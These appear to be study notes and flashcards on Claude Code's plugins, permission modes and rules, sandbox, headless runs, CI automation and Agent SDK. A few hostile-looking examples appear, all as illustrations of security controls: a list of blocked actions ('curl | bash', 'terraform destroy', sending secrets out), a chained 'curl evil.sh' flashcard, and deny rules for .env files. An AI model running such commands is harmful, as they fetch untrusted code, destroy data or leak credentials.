A marketplace is a repo or directory with .claude-plugin/marketplace.json. You add it once, then install by name, such as commit-commands@claude-plugins-official. Claude Code adds Anthropic's official marketplace on your first interactive session unless policy blocks it. Run /plugin and use the Discover tab; disable with /plugin or claude plugin disable.

• User: every project on this computer. Project: enabled for everyone via committed .claude/settings.json (each person still installs it). Local: you, this repo only.
  • A user-scope install in the terminal also appears in the desktop app's local sessions and VS Code, because they read the same settings files. Cloud sessions do not load your local plugins.
  • During development, load straight from a folder with --plugin-dir (it also accepts .zip, per the Week 19 digest).
  • claude plugin eval scores a plugin against test cases versus a no-plugin baseline (Week 37 digest).

• The overview says an enabled plugin is part of every session: each model-invocable skill, agent and command adds its name and description to context on every turn, its MCP servers run, and its hooks fire. Official-marketplace plugins show a Context cost estimate before install.
  • Plugins run code with your user privileges in any tier (official, community, third-party).
  • Managed settings can allowlist or block marketplaces and force-install plugins across an org.

Trap: Installing many plugins "just in case". Their descriptions cost context on every turn even when unused; check the Installed tab's Not used recently group.
Trap: Confusing a Claude Code plugin with the VS Code extension or JetBrains plugin. Those are IDE integrations, not plugins.
Synthesis: The features overview's trigger list is a good maturity ladder: CLAUDE.md first, skills when you repeat a prompt, hooks when something must always happen, and a plugin only when a second repository needs the same setup.

cards.q: Where does a plugin's manifest live?
cards.a: .claude-plugin/plugin.json inside the plugin directory.

cards.q: What file defines a plugin marketplace?
cards.a: .claude-plugin/marketplace.json in a repository or directory.

cards.q: How do you load a plugin you are developing without a marketplace?
cards.a: Start Claude Code with --plugin-dir pointing at the plugin folder (or a .zip).

cards.q: Why can an unused plugin still cost tokens?
cards.a: The names and descriptions of its model-invocable skills, agents and commands sit in context on every turn while it is enabled.

concepts.s: A permission mode sets which actions run without asking, from Manual (default) through acceptEdits, plan, auto, dontAsk and bypassPermissions, and you cycle the interactive ones with Shift+Tab.

x.b:
From the permission modes page:

  • default (shown as Manual): only reads run without asking.
  • acceptEdits: reads, file edits and common filesystem commands (mkdir, touch, mv, cp).
  • plan: reads, plus classifier-approved commands when auto mode is available; no source edits.
  • auto: everything, with a background classifier blocking risky actions.
  • dontAsk: pre-approved tools only; anything that would prompt is denied. For locked-down CI.
  • bypassPermissions (--dangerously-skip-permissions): everything; isolated containers and VMs only.

Deny rules apply in every mode, including bypass.

A separate classifier model reviews actions before they run and blocks anything that escalates beyond your request, targets unrecognized infrastructure or looks driven by hostile content. Examples blocked by default: curl | bash, production deploys, force pushes, git reset --hard, terraform destroy, sending secrets out. Three blocks in a row or 20 total pause auto mode and return to prompting. Explicit ask rules still force a prompt.

Starting mode: with v2.1.283 or later the built-in default is auto for interactive terminal and VS Code sessions, while claude -p and the Agent SDK default to Manual. permissions.defaultMode overrides it, but auto and bypassPermissions are ignored in project-level settings files.

• Writes to protected paths (.git, .vscode, .idea, .husky, .devcontainer, most of .claude, shell rc files, .npmrc, .mcp.json, .claude.json) are never auto-approved outside bypass mode.
  • rm and rmdir on critical targets (root, home, top-level dirs, the working directory) are blocked even in bypass; the docs call this best-effort, not a sandbox.
  • Bypass refuses to start as root or under sudo unless a recognized sandbox is detected; admins can disable it with permissions.disableBypassPermissionsMode: "disable".

Trap: Treating auto mode as a guarantee. The docs state it reduces prompts but does not guarantee safety; pair it with deny rules and the sandbox.
Trap: Committing defaultMode: "auto" or "bypassPermissions" to the repo's .claude/settings.json and expecting teammates to get it. Those values are ignored in project and local settings.
Trap: Running a scheduled claude -p job and wondering why tools are denied. Non-interactive runs default to Manual; pass --permission-mode or --allowedTools.

cards.q: Which permission mode denies anything not pre-approved instead of prompting?
cards.a: dontAsk.

cards.q: What does acceptEdits auto-approve beyond file edits?
cards.a: Common filesystem commands such as mkdir, touch, mv and cp.

cards.q: Do deny rules apply in bypassPermissions mode?
cards.a: Yes. Deny rules block in every mode, including bypassPermissions.

cards.q: What pauses auto mode and returns to prompting?
cards.a: Three classifier blocks in a row, or 20 blocks in total.

cards.q: What permission mode does claude -p start in when nothing sets one?
cards.a: Manual (default); auto is the built-in default only for interactive terminal and VS Code sessions on v2.1.283 or later.

concepts.n: Permission rules and the settings hierarchy
concepts.s: Allow, ask and deny rules in layered settings files decide what each tool may do, with deny always winning and managed settings sitting above everything a developer can change.

x.b:
The permissions page: rules are Tool or Tool(specifier), evaluated deny, then ask, then allow; the first match wins and specificity does not change the order.

{
  "permissions": {
    "allow": ["Bash(npm run *)", "Bash(git commit *)"],
    "ask":   ["Bash(git push *)"],
    "deny":  ["Read(./.env)", "Read(./.env.*)", "WebFetch"]
  }
}
  • Put * after the subcommand: Bash(git log *) allows only git log; Bash(git *) allows all git.
  • Shell operators are parsed: Bash(safe-cmd *) does not approve safe-cmd && other-cmd; deny and ask rules match any subcommand.
  • Paths use gitignore syntax: //path is filesystem-absolute, ~/path is home, /path is relative to the settings source, ./path or bare is relative to cwd.
  • A bare deny such as Bash removes the tool from Claude's context entirely.
  • Other forms: WebFetch(domain:example.com), mcp__server__tool, Agent(Explore), Skill(deploy *).

The settings page lists, highest first: managed (managed-settings.json, MDM, or server-managed from the claude.ai console), command line (--settings), project local .claude/settings.local.json, shared project .claude/settings.json, user ~/.claude/settings.json. List keys such as permissions.allow merge across files instead of overriding. A deny at any level cannot be allowed by another level.

~/.claude.json is a separate file Claude Code writes itself for account details, MCP servers and per-project trust. Run /status to see which sources loaded and claude doctor to see rejected entries. Settings reload on save, so permissions and hooks edits apply mid-session.

• allowManagedPermissionRulesOnly makes managed settings the only source of permission rules.
  • Committed permissions.allow rules and most env values wait until each teammate trusts the folder; deny and ask rules apply immediately.
  • The HIPAA setup page (Enterprise with a BAA) suggests managed keys forceLoginMethod: "claudeai", forceLoginOrgUUID, allowedProviders: ["anthropic"] and cleanupPeriodDays, requires v2.1.285 or later, and lists features turned off under that configuration: WebFetch, cloud sessions, Remote Control, feedback submission and artifact publishing.

Trap: Writing Read(/Users/me/secrets/**) expecting an absolute path. A single leading slash anchors at the settings source; use //Users/me/secrets/**.
Trap: Trying to carve an allow exception out of a broad deny. Bash(aws *) in deny blocks Bash(aws s3 ls) even if it is allowed.
Trap: Expecting CLAUDE.md to restrict tools. The docs note permission rules are enforced by Claude Code, not the model; prompts only shape what Claude tries.
Trap: A // comment or trailing comma in settings.json. Settings files are strict JSON and the file is reported as a Settings Error.

cards.q: In what order are permission rules evaluated?
cards.a: Deny, then ask, then allow; the first match wins regardless of specificity.

cards.q: Rank the settings sources from highest to lowest precedence.
cards.a: Managed, command line (--settings), .claude/settings.local.json, .claude/settings.json, ~/.claude/settings.json.

cards.q: How do you write an absolute path in a Read or Edit rule?
cards.a: Start it with two slashes, for example Read(//Users/alice/secrets/**).

cards.q: Does Bash(npm run *) approve npm run build && curl evil.sh?
cards.a: No. Each subcommand must match an allow rule independently.

cards.q: What happens when the same list key, like permissions.allow, appears in user and project settings?
cards.a: The lists merge, so both files' entries apply.

concepts.s: The Bash sandbox is an operating-system boundary around shell commands that limits which files they can write and which hosts they can reach, so sandboxed commands can run without per-command approval.

x.b:
The sandboxing page says the sandbox is off by default; turn it on with /sandbox or sandbox.enabled: true. It uses Seatbelt on macOS and bubblewrap plus socat on Linux and WSL2; native Windows runs commands unsandboxed. It is built on the open-source @anthropic-ai/sandbox-runtime package.

  • Writes: working directory, a per-user temp dir and added directories; protected paths stay write-denied.
  • Reads: most of the machine by default, including ~/.ssh and ~/.aws/credentials, unless you add denyRead.
  • Network: no direct route out; a local proxy checks each host against network.allowedDomains, which starts empty.
  • Scope: Bash, PowerShell and Monitor commands and their children. Read, Edit, WebFetch, MCP servers and hooks run outside it and follow permission rules instead.

{
  "sandbox": {
    "enabled": true,
    "allowUnsandboxedCommands": false,
    "filesystem": {
      "allowWrite": ["~/.kube", "/tmp/build"],
      "denyRead": ["~/"],
      "allowRead": ["."]
    }
  }
}

Place the read rules in project settings: . resolves to the project root there, but to ~/.claude in user settings. Sandbox paths use normal conventions (/tmp absolute, ~ home), unlike permission rules' // form.

• Auto-allow: commands that run inside the sandbox are approved without a prompt. Deny rules, content-scoped ask rules like Bash(git push *), and critical-path rm still apply.
  • Regular permissions mode: sandboxed commands still go through the normal prompt flow.
  • When a command fails in the sandbox, Claude may retry with dangerouslyDisableSandbox. Set allowUnsandboxedCommands: false (shown as Strict sandbox mode) to remove that retry, and failIfUnavailable to refuse unsandboxed runs when the sandbox cannot start.
  • excludedCommands runs listed tools fully outside the sandbox; the docs prefer allowWrite or allowedDomains when a tool needs just one more path or host.

Trap: Assuming the sandbox protects secrets from reads. Default reads include credential files; add denyRead or the credentials options.
Trap: Assuming allowedDomains limits WebFetch. It only governs sandboxed shell traffic; WebFetch follows permission rules.
Synthesis: Use permissions to decide what Claude may attempt and the sandbox to cap the blast radius if a prompt injection gets past that decision. The permissions docs describe the two as complementary layers; for full isolation of MCP servers and hooks too, run Claude Code itself in a container or VM.

cards.q: Which OS mechanism does the Claude Code sandbox use on macOS, and what on Linux?
cards.a: Seatbelt on macOS; bubblewrap plus socat on Linux and WSL2.

cards.q: Is the sandbox on by default?
cards.a: No. Enable it with /sandbox or sandbox.enabled: true.

cards.q: Which tools does the sandbox cover?
cards.a: Bash, PowerShell and Monitor commands and their child processes; file tools, WebFetch, MCP servers and hooks run outside it.

cards.q: How do you stop Claude from retrying a failed command outside the sandbox?
cards.a: Set sandbox.allowUnsandboxedCommands to false (Strict sandbox mode).

cards.q: What hosts can sandboxed commands reach by default?
cards.a: None. network.allowedDomains starts empty and a local proxy checks each host.

concepts.s: claude -p runs the full agent loop non-interactively for scripts and CI, with text, JSON or streamed JSON output, schema-validated results and explicit tool and permission flags.

x.b:
The headless page says -p (or --print) runs any claude command non-interactively and reads stdin, so it pipes like a Unix tool. Exit code 0 means success; a SIGTERM exits 143 and leaves the turn unfinished. Piped stdin is capped at 10MB.

cat build-error.txt | claude -p "concisely explain the root cause" > output.txt

claude -p "Find and fix the bug in auth.py" --allowedTools "Read,Edit,Bash"

claude --bare -p "Summarize README.md" --allowedTools "Read"

• --output-format text (default), json (result, session_id, metadata, total_cost_usd) or stream-json (newline-delimited events; add --verbose --include-partial-messages for tokens).
  • --json-schema '<schema>' with --output-format json puts validated output in structured_output; check that the field exists before using it.
  • The system/init event reports plugin_errors and mcp_server_errors, which a CI gate can fail on.
  • Multi-step: --continue for the latest conversation, or capture session_id and pass --resume.

--bare skips auto-discovery of hooks, skills, commands, subagents, plugins, MCP servers, auto memory and CLAUDE.md, so every machine gets the same result. It never reads OAuth or the keychain, so set ANTHROPIC_API_KEY. The docs call it the recommended mode for scripted and SDK calls and say it will become the default for -p in a future release.

  • --allowedTools uses permission rule syntax, e.g. "Bash(git diff *),Bash(git commit *)".
  • --permission-mode sets a baseline (acceptEdits, auto, dontAsk).
  • --permission-prompts none (v2.1.259 or later) denies anything that would wait for a human and tells Claude not to retry.
  • --append-system-prompt adds instructions; --system-prompt replaces the default.

Trap: Running -p without --bare in an untrusted checkout. Without it, a -p session runs the repo's .claude/settings.json hooks and connects .mcp.json servers with no trust dialog.
Trap: Writing Bash(git diff*) without a space. It also matches git diff-index; the space before * is what makes it a word-boundary prefix.
Trap: Expecting --bg with -p. Claude Code rejects the combination.

cards.q: Which flag makes a claude -p run skip local hooks, plugins, MCP servers and CLAUDE.md?
cards.a: --bare.

cards.q: Where does schema-validated output appear when you pass --json-schema?
cards.a: In the structured_output field of the --output-format json response.

cards.q: How do you continue a specific earlier headless conversation?
cards.a: Capture session_id from --output-format json, then run claude -p "..." --resume <session_id>.

cards.q: What are the three --output-format values?
cards.a: text (default), json and stream-json.

cards.q: Which flag denies every permission request that would wait for a human in an unattended run?
cards.a: --permission-prompts none (v2.1.259 or later).

concepts.n: GitHub Actions, CI and scheduled automation
concepts.s: The claude-code-action runs Claude Code inside GitHub workflows on @claude mentions or any event, and scheduled tasks, /loop and /goal keep Claude working on a clock or toward a condition.

x.b:
The GitHub Actions page: run /install-github-app in Claude Code (github.com repos only; needs gh and repo admin) to install the Claude GitHub App, store a secret and open a workflow PR. The secret is ANTHROPIC_API_KEY for an API key or CLAUDE_CODE_OAUTH_TOKEN for a subscription token from claude setup-token.

  • Interactive mode: no prompt input; Claude responds to the trigger phrase (@claude by default) in issues and PRs.
  • Automation mode: a prompt input (plain text or a /skill) runs on any event, including cron.
  • claude_args passes any CLI flag, e.g. --max-turns, --model, --allowedTools, --mcp-config.
- uses: anthropics/claude-code-action@v1
  with:
    anthropic_api_key: ${{ secrets.ANTHROPIC_API_KEY }}
    prompt: "Generate a summary of yesterday's commits and open issues"
    claude_args: |
      --allowedTools "mcp__github__list_commits,mcp__github__list_issues"

• Upgrading from @beta: switch to @v1, drop mode, rename direct_prompt to prompt, move CLI options into claude_args.
  • Org rollouts: the docs prefer a Console API key over an OAuth token for shared secrets, or workload identity federation (OIDC) to avoid a long-lived secret.
  • Only users with write access trigger runs by default, and bot actors are rejected unless listed in allowed_bots.
  • Commits pushed with the default GITHUB_TOKEN do not trigger other workflows; let the action authenticate as the Claude GitHub App.
  • Cost controls named in the docs: concise CLAUDE.md, --max-turns, workflow timeouts and concurrency limits. GitLab CI/CD and a managed Code Review product are separate options.

• /loop: /loop 5m check the deploy reruns a prompt in the open session; omit the interval and Claude picks one each iteration. Session-scoped, minimum 1 minute, up to 50 tasks, recurring tasks expire after 7 days.
  • Cloud scheduled tasks (formerly routines, research preview): a saved prompt plus repos and connectors that runs on Anthropic's cloud on a schedule (minimum 1 hour), an API call or GitHub events. Create with /schedule or at claude.ai/code. Desktop scheduled tasks run on your machine with local file access.
  • /goal: /goal all tests in test/auth pass and lint is clean keeps starting turns until a small fast model judges the condition met or impossible. Condition up to 4,000 characters; /goal clear stops it; works with -p.

Trap: Committing an API key in a workflow file. Store it as a GitHub secret and reference it.
Trap: Writing a /goal condition the evaluator cannot see. The goal docs say it judges only what Claude surfaced in the conversation and runs no commands itself, so state the proof, for example "npm test exits 0".
Trap: Relying on /loop for durable jobs. It stops when the session closes; use cloud or desktop scheduled tasks or a cron-triggered Action.

cards.q: Which command sets up the Claude GitHub App, secret and workflow from inside Claude Code?
cards.a: /install-github-app.

cards.q: What decides whether claude-code-action runs in interactive or automation mode?
cards.a: Whether the workflow provides a prompt input; without one it waits for the @claude trigger phrase.

cards.q: Which two secret names does the action accept for authentication?
cards.a: ANTHROPIC_API_KEY for an API key, or CLAUDE_CODE_OAUTH_TOKEN for a subscription token created with claude setup-token.

cards.q: When do recurring /loop tasks expire?
cards.a: Seven days after creation; they fire one last time and delete themselves.

cards.q: How does /goal decide the work is done?
cards.a: After each turn a small fast model checks the condition against the conversation and returns not yet met, met or impossible.

concepts.s: The Claude Agent SDK packages Claude Code's agent loop, tools, permissions, hooks, subagents and sessions as a Python or TypeScript library you embed in your own application.

x.b:
The SDK overview says it gives you the same tools, agent loop and context management that power Claude Code. Install claude-agent-sdk (Python 3.10+) or @anthropic-ai/claude-agent-sdk (Node 18+); both bundle a native Claude Code binary. query() returns an async iterator of messages as Claude thinks, calls tools and finishes.

import asyncio
from claude_agent_sdk import query, ClaudeAgentOptions

async def main():
    async for message in query(
        prompt="Review utils.py for bugs that would cause crashes. Fix them.",
        options=ClaudeAgentOptions(
            allowed_tools=["Read", "Edit", "Glob"],
            permission_mode="acceptEdits",
        ),
    ):
        print(message)

asyncio.run(main())

• Built-in tools, hooks (as callbacks), subagents, MCP (including in-process custom tools), permissions with a canUseTool approval callback, sessions that resume or fork, structured outputs, cost tracking and OpenTelemetry.
  • Per the overview's capability table, skills, commands and memory load from the project's .claude/ and ~/.claude/ the same as Claude Code; settingSources controls which filesystem settings load.
  • Other options include system_prompt, mcp_servers, agents and hooks. The SDK defaults to Manual permission mode.
  • Authentication is an API key (ANTHROPIC_API_KEY, not auto-loaded from .env) or Bedrock, Claude Platform on AWS, Vertex or Foundry flags.

The overview compares four options: the Agent SDK (embed Claude Code's agent in your own process), the CLI (interactive and one-off), the Client SDK (raw API, you write the tool loop) and Managed Agents (Anthropic hosts the harness). For other languages, run claude -p --output-format json as a subprocess. Anthropic's post on building agents with the SDK says the Claude Code SDK was renamed the Claude Agent SDK because the same harness can power many kinds of agents beyond coding, and it describes the same gather context, take action, verify work loop.

Trap: Shipping a product that signs users in with claude.ai. The overview says third-party developers may not offer claude.ai login or rate limits unless previously approved; use API keys.
Trap: Branding your agent as "Claude Code". Allowed: "Claude Agent" or "YourAgent Powered by Claude"; not permitted: "Claude Code", "Claude Code Agent" or look-alike visuals.
Trap: Assuming an SDK agent is isolated from your developer config. It loads .claude/ and ~/.claude/ unless you restrict setting sources, so a hook or MCP server on the build host can change behavior.
Synthesis: Treat the SDK as a deployable Claude Code: anything you prototype interactively (skills, hooks, subagents, permission rules) transfers, so prove the workflow in the CLI first, then pin settings sources and permissions when you embed it.

cards.q: What are the Agent SDK package names for Python and TypeScript?
cards.a: claude-agent-sdk on PyPI and @anthropic-ai/claude-agent-sdk on npm.

cards.q: What does query() return?
cards.a: An async iterator that yields messages (reasoning, tool calls, tool results, final result) as the agent loop runs.

cards.q: Can a third-party product built on the Agent SDK let users log in with claude.ai?
cards.a: Not unless previously approved by Anthropic; such products should use API key authentication.

cards.q: How do you drive the Claude Code agent loop from a language without an Agent SDK?
cards.a: Run claude -p with --output-format json (or stream-json) as a subprocess.

cards.q: Which Agent SDK option controls whether project and user filesystem settings load?
cards.a: settingSources (setting_sources in Python).
